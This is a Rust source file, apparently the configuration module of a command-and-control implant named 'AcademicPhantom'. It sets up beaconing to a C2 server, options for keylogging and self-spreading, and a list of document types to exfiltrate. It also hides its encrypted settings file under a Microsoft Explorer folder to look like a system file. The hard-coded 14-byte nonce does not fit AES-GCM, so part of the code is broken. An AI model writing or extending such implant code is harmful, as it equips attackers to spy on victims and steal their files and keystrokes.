use serde::{Serialize, Deserialize};
use std::fs;
use std::path::Path;
use aes_gcm::{
    aead::{Aead, KeyInit, generic_array::GenericArray},
    Aes256Gcm, Nonce,
};
use sha2::{Sha256, Digest};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Config {
    pub c2_domain: String,
    pub c2_port: u16,
    pub beacon_interval: u64,
    pub beacon_jitter: u64,
    pub first_run: bool,
    pub enable_spread: bool,
    pub enable_keylog: bool,
    pub exfil_extensions: Vec<String>,
    pub max_file_size: u64,
    pub user_agent: String,
    pub transport: String,
    pub encryption_key: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            c2_domain: "192.168.1.100".to_string(),
            c2_port: 443,
            beacon_interval: 60,
            beacon_jitter: 30,
            first_run: true,
            enable_spread: false,
            enable_keylog: false,
            exfil_extensions: vec![
                "pdf".to_string(),
                "docx".to_string(),
                "xlsx".to_string(),
                "pptx".to_string(),
                "txt".to_string(),
                "csv".to_string(),
            ],
            max_file_size: 50 * 1024 * 1024,
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
            transport: "https".to_string(),
            encryption_key: "AcademicPhantomKey2024Secure!!".to_string(),
        }
    }
}

impl Config {
    pub fn load() -> Result<Self, Box<dyn std::error::Error>> {
        let config_path = Self::get_config_path();
        
        if !Path::new(&config_path).exists() {
            let config = Config::default();
            config.save()?;
            return Ok(config);
        }
        
        let encrypted = fs::read(&config_path)?;
        let decrypted = Self::decrypt_config(&encrypted)?;
        let config: Config = serde_json::from_str(&decrypted)?;
        
        Ok(config)
    }
    
    pub fn save(&self) -> Result<(), Box<dyn std::error::Error>> {
        let json = serde_json::to_string_pretty(self)?;
        let encrypted = Self::encrypt_config(&json)?;
        fs::write(Self::get_config_path(), encrypted)?;
        Ok(())
    }
    
    pub fn mark_installed(&mut self) {
        self.first_run = false;
        let _ = self.save();
    }
    
    fn get_config_path() -> String {
        let appdata = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Temp".to_string());
        format!("{}\\Microsoft\\Windows\\Explorer\\config.dat", appdata)
    }
    
    fn encrypt_config(data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let key = Self::derive_key();
        let cipher = Aes256Gcm::new_from_slice(&key)?;
        let nonce = Nonce::from_slice(b"phantomnonce12");
        
        let ciphertext = cipher.encrypt(nonce, data.as_bytes())
            .map_err(|e| format!("Encryption failed: {}", e))?;
        
        Ok(ciphertext)
    }
    
    fn decrypt_config(data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
        let key = Self::derive_key();
        let cipher = Aes256Gcm::new_from_slice(&key)?;
        let nonce = Nonce::from_slice(b"phantomnonce12");
        
        let plaintext = cipher.decrypt(nonce, data)
            .map_err(|_| "Decryption failed")?;
        
        String::from_utf8(plaintext).map_err(|e| e.into())
    }
    
    fn derive_key() -> [u8; 32] {
        let mut hasher = Sha256::new();
        hasher.update(b"AcademicPhantom2024SecureKeySalt");
        hasher.finalize().into()
    }
}